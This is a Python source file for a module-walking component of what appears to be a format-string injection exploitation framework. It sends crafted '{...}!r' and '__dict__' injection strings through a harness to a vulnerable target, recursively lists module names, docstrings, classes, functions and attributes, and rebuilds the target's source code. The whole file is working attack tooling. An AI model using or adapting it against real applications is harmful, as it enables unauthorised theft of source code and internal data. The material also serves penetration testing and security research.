"""Implementation of the ModuleInjectionWalker class."""

import re

from typing import (
    Iterator,
    List,
    Optional,
    TYPE_CHECKING)

from .abstract_injection_walker import (
    AbstractInjectionWalker)
from .attribute_injection_walker import (
    AttributeInjectionWalker)
from .doc_string_injection_walker import (
    DocStringInjectionWalker)
from .failed_injection_walker import (
    FailedInjectionWalker)
from .function_injection_walker import (
    FunctionInjectionWalker)
from .name_injection_walker import (
    NameInjectionWalker)
from ..utils import (
    parse_dict_top_level_keys)

if TYPE_CHECKING:
    from .class_injection_walker import (
        ClassInjectionWalker)


MODULE_RE = r'<module .+>'


class ModuleInjectionWalker(AbstractInjectionWalker):
    """An injection walker for recovering module source code and other data."""

    INJECTION_RE = None
    RESPONSE_RE = None

    def __extra_init__(
        self
    ) -> None:
        self._name_walker = self.empty_instance(NameInjectionWalker)
        self._docstring_walker = self.empty_instance(DocStringInjectionWalker)

        self._class_walkers: List['ClassInjectionWalker'] = []
        self._function_walkers: List[FunctionInjectionWalker] = []
        self._attribute_walkers: List[AttributeInjectionWalker] = []

        self._src_code: Optional[str] = None

    def walk(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        yield from self._walk_name()
        if not self._name_walker.is_default:
            if self._name_walker.value in self._engine.module_blacklist:
                return

        yield from self._walk_doc()

        top_level_dict_keys = parse_dict_top_level_keys(self._raw_result)
        if not top_level_dict_keys:
            yield FailedInjectionWalker.msg(
                'Unable to parse dictionary keys from response '
                f'{self._raw_result} from injection {self._injection_str}')
            return

        for key in top_level_dict_keys:
            key_injection_str = f'{self._injection_str}[{key}]!r'
            result = self._harness.send_injection(key_injection_str)
            if result is None:
                yield FailedInjectionWalker.msg(
                    'Unable to recover response from injection string '
                    f'{key_injection_str}')
                continue

            # TODO: need a function blacklist, too
            next_walker = self.next_walker(key_injection_str, result)
            if next_walker is not None:
                from .class_injection_walker import ClassInjectionWalker  # noqa
                if isinstance(next_walker, ClassInjectionWalker):
                    self._class_walkers.append(next_walker)
                elif isinstance(next_walker, FunctionInjectionWalker):
                    self._function_walkers.append(next_walker)

                yield from next_walker.walk()
            elif re.search(MODULE_RE, result):
                mod_dict_injection_str = (
                    f'{key_injection_str.rstrip("!r")}.__dict__')
                result = self._harness.send_injection(
                    mod_dict_injection_str)
                if result is None:
                    yield FailedInjectionWalker.msg(
                        'Unable to recover expected module __dict__ via '
                        f'injection string {mod_dict_injection_str}')
                yield from ModuleInjectionWalker(
                    self._harness,
                    mod_dict_injection_str,
                    result,
                    self._bytecode_version,
                    self._engine).walk()
            else:
                attr_walker = AttributeInjectionWalker(
                    self._harness,
                    key_injection_str,
                    result,
                    self._bytecode_version,
                    self._engine)
                self._attribute_walkers.append(attr_walker)
                yield from attr_walker.walk()

        if not self._name_walker.is_default:
            self._engine.module_blacklist.add(self._name_walker.value)

    def _walk_name(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        """Recover this module's __name__ attribute."""
        name_injection = f'{self._injection_str}[__name__]!r'
        result = self._harness.send_injection(name_injection)
        if result is None:
            yield FailedInjectionWalker.msg(
                f'Unable to read response from injection {name_injection} '
                'when attempting to injection __name__ field of module')
            return

        walker = self.next_walker(name_injection, result)
        if not isinstance(walker, NameInjectionWalker):
            yield FailedInjectionWalker.msg(
                'Expected a name response when sending module name injection '
                f'with injection {name_injection}; got '
                f'{walker.__class__.__qualname__} instead')
            return

        yield from walker.walk()
        self._name_walker = walker

    def _walk_doc(
        self
    ) -> Iterator[AbstractInjectionWalker]:
        """Recover this module's __doc__ attribute."""
        docstring_injection = f'{self._injection_str}[__doc__]!r'
        result = self._harness.send_injection(docstring_injection)
        if result is None:
            yield FailedInjectionWalker.msg(
                'Unable to inject __doc__ attribute of module '
                f'{self._name_walker.value} with injection '
                f'{docstring_injection}')
            return

        walker = self.next_walker(docstring_injection, result)
        if not isinstance(walker, DocStringInjectionWalker):
            yield FailedInjectionWalker.msg(
                'Expected a docstring response when injecting the __doc__'
                f'attribute of module {self._name_walker.value} with '
                f'injection {docstring_injection}, but got '
                f'{walker.__class__.__qualname__} instead')
            return

        yield from walker.walk()
        self._docstring_walker = walker

    def _gen_src_code(
        self
    ) -> None:
        """Populate this class's :data:`src_code` property."""
        self._src_code = f'"""{self._docstring_walker.value}"""\n\n'
        self._src_code += '<OMITTED IMPORTS>\n\n\n'

        self._src_code += '\n'.join(
            [attr_walker.src_code for attr_walker in self._attribute_walkers
             if attr_walker.src_code is not None])

        self._src_code += '\n'

        self._src_code += '\n\n\n'.join(
            [func_walker.src_code for func_walker in self._function_walkers
             if func_walker.src_code is not None])

        self._src_code += '\n'

        self._src_code += '\n\n\n'.join(
            [class_walker.src_code for class_walker in self._class_walkers
             if class_walker.src_code is not None])

    @property
    def name_walker(
        self
    ) -> NameInjectionWalker:
        """The walker used to recover this module's __name__."""
        return self._name_walker

    @property
    def docstring_walker(
        self
    ) -> DocStringInjectionWalker:
        """The walker used to recover this module's __doc__ string."""
        return self._docstring_walker

    @property
    def class_walkers(
        self
    ) -> List['ClassInjectionWalker']:
        """Class walkers spawned from this module's enumeration."""
        return self._class_walkers

    @property
    def function_walkers(
        self
    ) -> List[FunctionInjectionWalker]:
        """Function walkers spawned from this module's enumeration."""
        return self._function_walkers

    @property
    def attribute_walkers(
        self
    ) -> List[AttributeInjectionWalker]:
        """Attribute walkers spawned from this module's enumeration."""
        return self._attribute_walkers
